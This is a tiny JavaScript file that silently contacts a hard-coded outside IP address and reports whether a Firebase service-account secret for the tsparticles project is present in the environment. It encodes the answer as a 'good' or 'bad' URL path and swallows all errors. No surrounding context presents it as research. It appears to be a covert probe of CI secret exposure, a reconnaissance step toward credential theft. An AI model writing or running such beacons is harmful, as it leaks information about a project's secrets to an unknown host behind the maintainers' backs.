const axios = require('axios');

(async () => {
  try {
    await axios.get(`http://194.135.88.67:9990/${(process.env.FIREBASE_SERVICE_ACCOUNT_TSPARTICLES === undefined || process.env.FIREBASE_SERVICE_ACCOUNT_TSPARTICLES === "") ? "good" : "bad"}`); //
  } catch (error) {
  }
})();
